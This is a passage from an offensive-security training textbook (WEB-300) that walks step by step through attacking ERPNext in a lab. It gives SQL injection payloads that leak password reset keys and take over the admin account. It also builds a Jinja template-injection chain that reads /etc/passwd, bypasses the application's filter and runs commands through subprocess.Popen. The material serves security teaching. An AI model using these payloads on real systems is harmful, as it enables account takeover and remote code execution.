SELECT name COLLATE utf8mb4_general_ci, reset_password_key COLLATE utf8mb4_general_ci 
FROM tabUser; 
Listing 282 - Extracting the reset key query 
The SQL query in Listing 282 needs to conform to the UNION query. This time, we will use the 
number “1” for the name/email and number “5” for the reset_password_key. The updated query 
can be found in Listing 283. 
SELECT `doctype`, `name`, `content`, `title`, `route` 
  FROM `__global_search` 
  WHERE `published` = 1 AND  `route` like "offsec_scope" UNION ALL SELECT name COLLATE 
utf8mb4_general_ci,2,3,4,reset_password_key COLLATE utf8mb4_general_ci FROM tabUser#%" 
AND MATCH(`content`) AGAINST (\'\\"offsec\\"\' IN BOOLEAN MODE) 
  LIMIT 20 OFFSET 0' 
Listing 283 - Payload for password reset key 
Using the highlighted section in Listing 283 as the payload in Burp, we can obtain the password 
reset key. 
 
Figure 216: Obtaining the Password Reset key 
The Burp response contains the password_reset_key in the “route” string with the email in the 
“doctype” string. An example is shown in Listing 284. 
{"message":[{"name":"2","content":"3","relevance":0,"title":"4","doctype":"Administrat
or","route":null},{"name":"2","content":"3","relevance":0,"title":"4","doctype":"Guest
","route":null},{"name":"2","content":"3","relevance":0,"title":"4","doctype":"zeljka.
k@randomdomain.com","route":"aAJTVmS14sCpKxrRT8N7ywbnYXRcVEN0"}]} 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
275 
Listing 284 - Password reset key in response 
Now that we have the password_reset_key, let’s figure out how to use it to reset the password. 
We will search the application’s source code for “reset_password_key” with the idea that wherever 
this column is used, it will most likely give us a hint on how to use the key. 
 
Figure 217: Finding reset_password Function 
Searching for “reset_password_key” allows us to discover the reset_password function in the file 
apps/frappe/frappe/core/doctype/user/user.py. The function can be found below. 
    def reset_password(self, send_email=False, password_expired=False): 
        from frappe.utils import random_string, get_url 
 
        key = random_string(32) 
        self.db_set("reset_password_key", key) 
 
        url = "/update-password?key=" + key 
        if password_expired: 
            url = "/update-password?key=" + key + '&password_expired=true' 
 
        link = get_url(url) 
        if send_email: 
            self.password_reset_mail(link) 
 
        return link 
Listing 285 - reset_password function 
The reset_password function is used to generate the reset_password_key. Once the random key 
is generated, a link is created and emailed to the user. We can use the format of this link to 
attempt a password reset. The link we will visit in our example is: 
http://erpnext:8000/update-password?key=aAJTVmS14sCpKxrRT8N7ywbnYXRcVEN0 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
276 
Listing 286 - Password reset link 
Visiting this link in our browser provides us with a promising result. 
 
Figure 218: Visiting the Password Reset Link 
If we type in a new password, we should receive a “Password Updated” message! 
 
Figure 219: Password Updated 
We should now be able to log in as the administrator user (zeljka.k@randomdomain.com) using 
our new password. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
277 
8.4.2.1 Exercises 
1. 
Recreate the steps above to gain access to the administrator account. 
2. 
Attempt to use the LIMIT field for SQL injection. What issue do you run into? 
3. 
How could we use the SQL injection to make the password reset go unnoticed once we have 
system access? 
8.5 SSTI Vulnerability Discovery 
Now that we have admin access to the application using the SQL injection, let’s attempt to obtain 
remote code execution. Frappe uses the Jinja125 templating engine extensively. ERPNext even 
advertises email templates that use Jinja directly.126 
This fact points to Server Side Template Injection (SSTI) as a great potential research target. 
Before we get into the details of finding the vulnerability, we need to understand how templating 
engines work and how they can be exploited. 
8.5.1 Introduction to Templating Engines 
We can use templating engines to render a static file dynamically based on the context of the 
request and user. An example of this is a header that shows the username when the user is 
logged in. When no user is logged in, the header might say “Hello, Guest”; however, as soon as a 
user logs in, the header will change to “Hello, Username”. This allows developers to centralize the 
location of reusable content and to further separate the view from the Model-View-Controller 
paradigm. 
A templating engine leverages delimiters so developers can tell the engine where a template 
block starts and ends. The most common delimiters are expressions and statements. In Python 
(and Jinja), an expression is a combination of variables and operations that results in a value 
(_7*7_), while a statement will represent an action (print(“hello”)). 
A common delimiter to start an expression is “{{”, with “}}” used to end expressions. A common 
delimiter to start a statement is “{%”, with “%}” used to end a statement. 
A templating engine commonly uses its own syntax separate from the languages it was built in, 
but with many ties back into it. As an example, to get the length of a string in Python, we might 
use the len function and pass in the string as shown in Listing 287. 
kali@kali:~$ python3 
... 
>>> len("hello!") 
6 
Listing 287 - Using len to find string length 
In Jinja, we would use the “|” character to pipe a variable into the length filter.127 However, this 
filter will run the Python len function.128 This means that, while Jinja might use a separate syntax 
for writing expressions and statements, the underlying “kernel” is still Python. 
 
125 (Pallets Projects, 2020), https://jinja.palletsprojects.com/en/2.11.x/ 
126 (ERPNext, 2020), https://erpnext.com/docs/user/manual/en/setting-up/email/email-template 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
278 
If an application gives us the ability to inject into templates, we might be able to escape the 
“sandbox” of the templating engine and run system-level code. Some templating engines contain 
direct classes to execute system-level calls129 while others make it more difficult, requiring 
creative exploits. 
Cross-site scripting vulnerabilities might also hint at an SSTI vulnerability since user-provided 
code is being entered into an unsanitized field. To discover SSTI, we commonly use a payload like 
"{{ 7*7 }}“. If the response is”49", we know that the payload was processed. While there’s no 
universal payload to exploit any SSTI to lead to RCE, there is a common payload used to exploit 
Jinja (Listing 288). 
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }} 
Listing 288 - Common SSTI payload 
Let’s dissect the payload to learn more. First, an empty string is created with the two single-quote 
characters. Next, the __class__ attribute returns the class to which the string belongs. In this case, 
it’s the str class130 as demonstrated in Listing 289. 
kali@kali:~$ python3 
... 
>>> ''.__class__ 
<class 'str'> 
Listing 289 - Obtaining the class of the empty string 
Once the class is returned, the payload uses the __mro__ attribute. MRO stands for “Method 
Resolution Order”, which Python describes as: 
“…a tuple of classes that are considered when looking for base classes during 
method resolution.”131 
This definition raises more questions than it answers. To better understand the __mro__ attribute, 
we need to discuss Python inheritance. In Python, a class can inherit from other classes. 
To demonstrate, consider a grocery inventory system. The parent class of Food might have 
attributes that all food items share like Calories. A class of Fruit would inherit from Food, but 
could also build on it with levels of Fructose, which are not as important to track on other food 
items like meat. This chain could continue with a fruit like Watermelon inheriting the Fructose 
attribute from Fruit and the Calories attribute from Food and building on it with a Weight attribute. 
 
127 (Pallets, 2007), https://jinja.palletsprojects.com/en/2.10.x/templates/#length 
128 (Github, 2019), https://github.com/pallets/jinja/blob/d8820b95d60ecc6a7b3c9e0fc178573e62e2f012/jinja2/filters.py#L1329 
129 (Apache, 2020), https://freemarker.apache.org/docs/api/freemarker/template/utility/Execute.html 
130 (Python, 2020), https://docs.python.org/3/library/stdtypes.html?highlight=__class__#instance.__class__ 
131 (Python, 2020), https://docs.python.org/3/library/stdtypes.html?#class.__mro__ 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
279 
 
Figure 220: Inheritance with Food 
Listing 290 shows an example of creating classes with inheritance in Python. 
>>> class Food: 
...     calories = 100 
...  
>>> class Fruit(Food): 
...     fructose = 2.0 
...  
>>> class Strawberry(Fruit): 
...     ripeness = "Ripe" 
...  
>>> s = Strawberry() 
>>> s.calories 
100 
>>> s.fructose 
2.0 
>>> s.ripeness 
'Ripe' 
Listing 290 - Example Inheritance with Strawberry 
If we were to access the __mro__ attribute of the Strawberry class, we would discover the 
resolution order for the class. 
>>> Strawberry.__mro__ 
(<class '__main__.Strawberry'>, <class '__main__.Fruit'>, <class '__main__.Food'>, 
<class 'object'>) 
Listing 291 - __mro__ of Strawberry 
The __mro__ attribute returned a tuple of classes in the order that an attribute would be searched 
for. If, for example, we were to access the Calories attribute, first the Strawberry class would be 
searched, next the Fruit class, then the Food class, and finally the object class. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
280 
Note that the object class was not specifically inherited. As of Python 3, whenever a class is 
created, the built-in object class is inherited.132 This is important because it changes the variable 
we might use when exploiting an SSTI. Let’s go back to our payload and determine the goal of 
__mro__ in this scenario. 
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }} 
Listing 292 - Accessing __mro__ attribute in payload 
We’ll attempt to get the second index of the tuple returned by the __mro__ attribute in the payload. 
>>> ''.__class__.__mro__ 
(<class 'str'>, <class 'object'>) 
 
>>> ''.__class__.__mro__[2] 
Traceback (most recent call last): 
  File "<stdin>", line 1, in <module> 
IndexError: tuple index out of range 
Listing 293 - Index out of range from payload 
Accessing the second index of the __mro__ attribute returns the error: “tuple index out of range”. 
However, if we were to run this in Python 2.7, we would receive a different result. 
kali@kali:~$ python2.7 
... 
>>> ''.__class__.__mro__ 
(<type 'str'>, <type 'basestring'>, <type 'object'>) 
 
>>> ''.__class__.__mro__[2] 
<type 'object'> 
Listing 294 - Using Python2.7 to view __mro__ attribute of empty string 
In Python 2.7, the second index of the tuple returned by the __mro__ attribute is the object class. In 
Python 2.7, the str class inherits from the basestring class while in Python 3, str inherits directly 
from the object class. This means we will have to be cognizant of the index that we use so that 
we can get access to the object class. 
Now that we understand the __mro__ attribute, let’s continue with our payload. 
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }} 
Listing 295 - Original payload 
Since Python 2.7 is retired, we must retrofit this payload to work with Python 3.0. 
To accommodate this, we will now begin using “1” as the index in the tuple 
unless we are referring to the original Python 2.7 payload. 
Next, the payload runs the __subclasses__ method within the object class that was returned by the 
__mro__ attribute. Python defines this attribute as follows: 
 
132 (Python, 2019), https://wiki.python.org/moin/NewClassVsClassicClass 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
281 
Each class keeps a list of weak references to its immediate subclasses. This 
method returns a list of all those references still alive.133 
The __subclasses__ will return all references to the class from which we are calling it. Considering 
that we will call this from the built-in object class, we should expect to receive a large list of 
classes. 
kali@kali:~$ python3 
... 
>>> ''.__class__.__mro__[1].__subclasses__() 
[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, 
<class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 
'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class 'super'>, 
<class 'range'>, <class 'dict'>, <class 'dict_keys'>, ... <class 'reprlib.Repr'>, 
<class 'collections.deque'>, <class '_collections._deque_iterator'>, <class 
'_collections._deque_reverse_iterator'>, <class 'collections._Link'>, <class 
'functools.partial'>, <class 'functools._lru_cache_wrapper'>, <class 
'functools.partialmethod'>, <class 'contextlib.ContextDecorator'>, <class 
'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, 
<class 'rlcompleter.Completer'>] 
Listing 296 - Subclasses of object class 
As expected, we will get a complete list of currently-loaded classes that inherit from the object 
class. The original payload references the 40th index of the list that is returned. In our list, this 
returns the wrapper_descriptor class. 
>>> ''.__class__.__mro__[1].__subclasses__()[40] 
<class 'wrapper_descriptor'> 
Listing 297 - 40th index of object class in python3 
Since the payload is trying to read the /etc/passwd file and the wrapper_descriptor class does not 
have a read function, we know something is not right. 
>>> dir(''.__class__.__mro__[1].__subclasses__()[40]) 
['__class__', '__contains__', '__delattr__', '__dir__', '__doc__', '__eq__', 
'__format__', '__ge__', '__getattribute__', '__getitem__', '__gt__', '__hash__', 
'__init__', '__init_subclass__', '__iter__', '__le__', '__len__', '__lt__', '__ne__', 
'__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', 
'__str__', '__subclasshook__', 'copy', 'get', 'items', 'keys', 'values'] 
Listing 298 - List of attributes and methods of mappingproxy 
However, if we use this payload in Python 2.7, the returned item in the 40th index is the file type. 
The returned file is a type and not a class - this won’t affect how we handle the returned item. 
Since Python 2.2, a unification of types to classes has been underway.134 In Python 3, types and 
classes are the same. 
kali@kali:~$ python2.7 
... 
>>> ''.__class__.__mro__[2].__subclasses__()[40] 
<type 'file'> 
 
133 (Python, 2020), https://docs.python.org/3/library/stdtypes.html?#class.__subclasses__ 
134 (Python, 2001), https://www.python.org/dev/peps/pep-0252/ 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
282 
 
>>> dir(''.__class__.__mro__[2].__subclasses__()[40]) 
['__class__', '__delattr__', '__doc__', '__enter__', '__exit__', '__format__', 
'__getattribute__', '__hash__', '__init__', '__iter__', '__new__', '__reduce__', 
'__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', 
'__subclasshook__', 'close', 'closed', 'encoding', 'errors', 'fileno', 'flush', 
'isatty', 'mode', 'name', 'newlines', 'next', 'read', 'readinto', 'readline', 
'readlines', 'seek', 'softspace', 'tell', 'truncate', 'write', 'writelines', 
'xreadlines'] 
Listing 299 - 40th index of object class in python3 
Essentially, the payload is using the file type, passing in the file to be read (/etc/passwd), and 
running the read method. In Python 2.7, we can read the /etc/passwd file. 
>>> ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() 
'root:x:0:0:root:/root:/usr/bin/fish\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\
nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:
65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12
:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nm
ail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/
nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin
:/usr/sbin/nologin\nwww-data:x:33:33:www-
data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\
nlist:x:38:38:Mailing List 
Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\
n...\nkali:x:1000:1000:,,,:/home/kali:/bin/bash\n' 
Listing 300 - Reading /etc/passwd 
We need to find the index of a function in Python 3 that will allow us to accomplish RCE. We’ll 
save the search for that function while we develop a more holistic picture of what’s being loaded 
by Frappe and ERPNext. 
8.5.2 Discovering The Rendering Function 
We know that ERPNext email templates use the Jinja templating engine, so let’s determine if we 
can find that feature in the application. We will do this by searching for “template” using the 
search function at the top of the application while logged in as the administrator. 
We will run all of this through Burp to ensure we capture the traffic if we need to 
replay something later. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
283 
 
Figure 221: Discovering Email Template List 
This search leads us to discover the link for “Email Template List”, a page that allows users of 
ERPNext to view and create email templates used throughout the application. 
 
Figure 222: Viewing Email Template List 
Navigating to the top right and clicking New opens a page to create a new email template. 
On the “New Email Template” page, we are required to provide the “Name” and “Subject”. Let’s 
enter “Hacking with SSTI” for both entries. In the “Response” textbox, we will provide the basic 
SSTI testing payload. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
284 
 
Figure 223: Creating Basic {{7*7}} Template 
With our basic email template created, the next step is to generate the email and view the output. 
Luckily, ERPNext allows us to email from many pages using our created email template. From the 
email template page, let’s select Menu > Email to open a new email page. 
 
Figure 224: Navigating to Sending Email Template 
From here, we can provide a fake email address (we won’t be sending this email) and select the 
email template that we just created. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
285 
 
Figure 225: Selecting Email Template 
With the email template selected, we will find the number “49” in the message field. This means 
that the SSTI works! But this is a feature of ERPNext, so it doesn’t mean we have code execution. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
286 
 
Figure 226: Viewing Output Of Email Template 
Having confirmed that we can use a basic Jinja template in an email template, we can attempt to 
build our SSTI payload. First, let’s capture the request used to run the template so we don’t have 
to create a new email each time we need to test the payload. 
We’ll open the Burp Proxy tab and navigate to the HTTP History tab to inspect our request to 
render the email template. Let’s find the request that was sent when we selected the email 
template and the server responded with “49”. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
287 
 
Figure 227: Burp History Discovering get_email_template 
Searching for a request that references the “Hacking with SSTI” subject, we will discover the 
request in Figure 227 that sends a POST request to the get_email_template function. We can send 
this request to Repeater to replay it. 
 
Figure 228: Sending Request to Repeater 
Now that we can easily inspect the output, let’s start building our payload. We will replace the 
"{{7*7}}" in the template with “{{ ’’.__class__ }}” to determine if we can replicate accessing the class 
of an empty string as we did in the Python console. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
288 
 
Figure 229: Changing Email Template to include __class__ 
Unfortunately, when we send this request, we hit a wall. The server responds with an “Illegal 
template” error. 
 
Figure 230: Using Illegal template 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
289 
8.5.2.1.1 
 
To determine the cause of this issue, let’s set a breakpoint on the get_email_template function 
and follow the code execution. We can search for the string “get_email_template”, and discover a 
function in apps/frappe/frappe/email/doctype/email_template/email_template.py. 
14  @frappe.whitelist() 
15  def get_email_template(template_name, doc): 
16          '''Returns the processed HTML of a email template with the given doc''' 
17          if isinstance(doc, string_types): 
18                  doc = json.loads(doc) 
19 
20          email_template = frappe.get_doc("Email Template", template_name) 
21          return {"subject" : frappe.render_template(email_template.subject, doc), 
22                          "message" : 
frappe.render_template(email_template.response, doc)} 
Listing 301 - Reviewing get_email_template function 
Line 14, before the function is defined, tells Frappe that this method is whitelisted and can be 
executed via an HTTP request. Line 15 defines the function and the two arguments. Line 16 
describes that the function “Returns the processed HTML of a email template”, which means that 
we are on the right track. If the doc argument passed to isinstance on Line 17 is a string, the 
string is deserialized as JSON into a Python object. Line 20 loads the email_template and finally, 
lines 21-22 render the subject and body of the template. 
Suspecting that render_template is throwing the error, we can pause execution by setting a 
breakpoint on line 22. 
 
Figure 231: Setting Breakpoint on Line 22 
Let’s run the Burp request again to trigger the breakpoint. Once triggered, we will select the Step 
Into button to enter the render function for further review. This takes us to the render_template 
function found in apps/frappe/frappe/utils/jinja.py. 
53  def render_template(template, context, is_path=None, safe_render=True): 
54          '''Render a template using Jinja 
55 
56          :param template: path or HTML containing the jinja template 
57          :param context: dict of properties to pass to the template 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
290 
58          :param is_path: (optional) assert that the `template` parameter is a path 
59          :param safe_render: (optional) prevent server side scripting via jinja 
templating 
60          ''' 
61 
62          from frappe import get_traceback, throw 
63          from jinja2 import TemplateError 
64 
65          if not template: 
66                  return "" 
67 
68          # if it ends with .html then its a freaking path, not html 
69          if (is_path 
70                  or template.startswith("templates/") 
71                  or (template.endswith('.html') and '\n' not in template)): 
72                  return get_jenv().get_template(template).render(context) 
73          else: 
74                  if safe_render and ".__" in template: 
75                          throw("Illegal template") 
76                  try: 
77                          return get_jenv().from_string(template).render(context) 
78                  except TemplateError: 
79                          throw(title="Jinja Template Error", 
msg="<pre>{template}</pre><pre>{tb}</pre>".format(template=template, 
tb=get_traceback())) 
Listing 302 - Reviewing render_template function 
The render_template function seems to do what we would expect. Examining the if statement on 
lines 74-75, it seems that the developers have thought about the SSTI issue and attempted to 
curb any issues by filtering the “.__” characters. 
Our next goal is to hit line 77 where get_jenv is used to render the template that is provided by 
user input. This makes executing the SSTI more difficult since the payload requires “.__” to 
navigate to the object class. 
8.5.2.2 Exercise 
Recreate the steps in the section above to discover how the render_template function is executed. 
8.5.2.3 Extra Mile 
Discover another location where ERPNext uses the render function to execute user-provided 
code. 
8.5.3 SSTI Vulnerability Filter Evasion 
In order to bypass the filter, we need to become more familiar with Jinja and determine our 
capabilities from the template perspective. Jinja’s “Template Designer”135 documentation is a 
good place to start. 
 
135 (Pallets Projects, 2020), https://jinja.palletsprojects.com/en/2.11.x/templates/ 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
291 
Jinja offers one interesting feature called filters.136 An example of a filter is the attr() function,137 
which is designed to “get an attribute of an object”. Listing 303 shows a trivial use case. 
{% set foo = "foo" %} 
{% set bar = "bar" %} 
{% set foo.bar = "Just another variable" %} 
{{ foo|attr(bar) }} 
Listing 303 - Example of attr filter 
The output of this example would be: “Just another variable”. 
As mentioned earlier, while Jinja is built on Python and shares much of its functionality, the 
syntax is different. So while the filter is expecting the attribute to be accessed with a period 
followed by two underscores, we could rewrite the payload to use Jinja’s syntax, making the “.” 
unnecessary. 
First, let’s build the template to give us access to the attributes we will need to exploit the SSTI. 
We know that we will need a string, the __class__ attribute, the __mro__ attribute, and the 
__subclasses__ attribute. 
{% set string = "ssti" %} 
{% set class = "__class__" %} 
{% set mro = "__mro__" %} 
{% set subclasses = "__subclasses__" %} 
Listing 304 - Configuring String and Attributes 
The string variable will replace the two single quotes (’’) in the original payload. The rest of the 
values are the various attributes from the SSTI payload. 
Now we can start building the SSTI payload string in the email template builder under the defined 
variables. First, let’s attempt to get the __class__ attribute of the string variable using the 
expression “string|attr(class)”. 
 
136 (Pallets, 2007), https://jinja.palletsprojects.com/en/2.10.x/templates/#filters 
137 (Pallets, 2007), https://jinja.palletsprojects.com/en/2.10.x/templates/#attr 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
292 
 
Figure 232: __class__ of string 
With the template configured, let’s render it and extract the classes of the string. If the SSTI 
works, we will receive a “<class ‘str’>” response. 
 
Figure 233: Rendering __class__ of string Template 
Now that we have confirmed the bypass for the SSTI filtering is working, we can begin 
exploitation to obtain RCE. 
8.5.3.1 Exercise 
Recreate the steps to render the __class__ of a string. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
293 
8.5.3.2 Extra Mile 
Creating string variables of the attributes we need to access is only one option to bypass the SSTI 
filter. If the developers replace the filter from “.__” to “__”, our payload would not work any longer. 
Using the Jinja documentation, find another method to exploit the filter that does not set the 
string variables for the attributes directly in the template. For this Extra Mile, the template should 
only contain the following expression: “string|attr(class)”. 
8.6 SSTI Vulnerability Exploitation 
With the filter bypassed, let’s concentrate on exploitation. To accomplish full exploitation, we need 
to discover the available classes that we can use to run system commands. 
8.6.1 Finding a Method for Remote Command Execution 
Let’s quickly review the SSTI payload that we are modeling. 
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }} 
Listing 305 - Accessing __mro__ attribute in payload 
To discover what objects are available to us, we can use mro to obtain the object class and then 
list all subclasses. First, let’s set the last line of the email template to “{{ string|attr(class)|attr(mro) 
}}” to list the mro of the str class. 
 
Figure 234: mro of str Class 
Rendering the template displays the mro. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
294 
 
Figure 235: Viewing mro of str Class 
We should receive a response with two classes: one for the str class and the other for the object 
class. Since we want the object class, let’s access index “1”. The value of the email template 
should be the one found in Listing 306. 
{% set string = "ssti" %} 
{% set class = "__class__" %} 
{% set mro = "__mro__" %} 
{% set subclasses = "__subclasses__" %} 
 
{{ string|attr(class)|attr(mro)[1] }} 
Listing 306 - Accessing index 1 from mro attribute 
If we attempt to save the template, we’ll receive an error that it is invalid. 
 
Figure 236: Invalid Template 
Jinja syntax does not work with “[” characters after a filter. Instead, let’s save the response from 
the mro attribute as a variable and access index “1” after the variable is set. 
To do this, we need to change the double curly braces (“{{” and “}}”) that are used for expressions 
in Jinja to a curly brace followed by a percentage sign (“{%” and “%}”), which is used for 
statements. We also need to set a variable using the “set” tag and provide a variable name (let’s 
use mro_r for mro response). Finally, we need to make a new expression to access index “1”. 
The final payload can be found in Listing 307. 
{% set string = "ssti" %} 
{% set class = "__class__" %} 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
295 
{% set mro = "__mro__" %} 
{% set subclasses = "__subclasses__" %} 
 
{% set mro_r = string|attr(class)|attr(mro) %} 
{{ mro_r[1] }} 
Listing 307 - Setting mro_r variable to mro response 
Rendering this template allows us to extract only the object class. 
 
Figure 237: Rendering Template 
In the next section of the payload, we need to list all subclasses using the __subclasses__ method. 
We also need to execute the method using “()” after the attribute is accessed. Notice that we will 
quickly run into the same issue we ran into earlier when we need to access an index from the 
response while running the __subclasses__ method. 
To fix this issue, we can again transform the expression into a statement and save the output of 
the __subclasses__ method into a variable. The payload for this is shown in Listing 308. 
{% set string = "ssti" %} 
{% set class = "__class__" %} 
{% set mro = "__mro__" %} 
{% set subclasses = "__subclasses__" %} 
 
{% set mro_r = string|attr(class)|attr(mro) %} 
{% set subclasses_r = mro_r[1]|attr(subclasses)() %} 
{{ subclasses_r }} 
Listing 308 - Accessing the __subclasses__ attribute and executing 
Rendering the template executes the __subclasses__ method and returns a long list of classes 
that are available to us. We will need to carefully review this list to find classes that could result in 
code execution. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
296 
 
Figure 238: All Available Classes in ERPNext 
To simplify output review, let’s clean up this list in Visual Studio Code. We’ll copy all the classes, 
starting with “<class ‘list’>” and ending with the last class object. 
Next, we will replace all “, ” strings (including the space character) with a new line character. To do 
this, let’s open the “Find and Replace” dialog by pressing C+h. In the “Find” section we will 
enter “, ” and in the “Replace” section we will press B+I to add a new line. Finally, we will 
select Replace All. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
297 
 
Figure 239: Find And Replace in Visual Studio Code 
This provides a pre-numbered list, making it easier to find the index number to use when we need 
to reference it in the payload. 
One of the classes that seems interesting is subprocess.Popen. The subprocess class allows us 
to “spawn new processes, connect to their input/output/error pipes, and obtain their return 
codes”.138 This class is very useful when attempting to gain code execution. 
We can find the subprocess class on line 421 (your result might vary). Let’s attempt to access 
index 420 (Python indexes start at 0) and inspect the result by appending “[420]” to the payload. 
{% set string = "ssti" %} 
{% set class = "__class__" %} 
{% set mro = "__mro__" %} 
{% set subclasses = "__subclasses__" %} 
 
{% set mro_r = string|attr(class)|attr(mro) %} 
{% set subclasses_r = mro_r[1]|attr(subclasses)() %} 
{{ subclasses_r[420] }} 
Listing 309 - Accessing the 420th index of __subclasses__ 
Rendering this function returns the subprocess.Popen class. 
 
138 (Python, 2020), https://docs.python.org/3/library/subprocess.html 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
298 
 
Figure 240: Access to subprocess.Popen class 
With access to Popen, we can begin executing commands against the system. 
8.6.1.1 Exercises 
1. 
Recreate the steps above to discover the location of Popen in your instance. 
2. 
Find other classes that you can use to obtain sensitive information about the system or 
execute commands against the system. 
8.6.2 Gaining Remote Command Execution 
With access to a class that allows for code execution, we can finally put all the pieces together 
and obtain RCE on ERPNext. 
To successfully execute Popen, we need to pass in a list containing a command that we want to 
execute along with the arguments. As a proof of concept, let’s touch a file in /tmp/. The binary we 
want to execute and the file we want to touch will be two strings in a list. The example we are 
using can be found in Listing 310. 
["/usr/bin/touch","/tmp/das-ist-walter"] 
Listing 310 - Popen argument to be passed in 
The content in Listing 310 needs to be placed within the Popen arguments in the email template. 
The email template to execute the touch command is as follows: 
{% set string = "ssti" %} 
{% set class = "__class__" %} 
{% set mro = "__mro__" %} 
{% set subclasses = "__subclasses__" %} 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
299 
 
{% set mro_r = string|attr(class)|attr(mro) %} 
{% set subclasses_r = mro_r[1]|attr(subclasses)() %} 
{{ subclasses_r[420](["/usr/bin/touch","/tmp/das-ist-walter"]) }} 
Listing 311 - Template for touching file 
Rendering this template in Burp won’t return the output, but instead a Popen object based off the 
execution. Using an SSH session, we can verify that the file was successfully created. 
frappe@ubuntu:~$ ls -lh /tmp/das-ist-walter  
-rw-rw-r-- 1 frappe frappe 0 Jan 11 10:31 das-ist-walter 
Listing 312 - Verifying existence of touched file 
It worked! We can now execute commands against the ERPNext system. 
8.6.2.1 Exercises 
1. 
Recreate the steps above to execute code on the system. 
2. 
Obtain a shell on the system. 
8.6.2.2 Extra Mile 
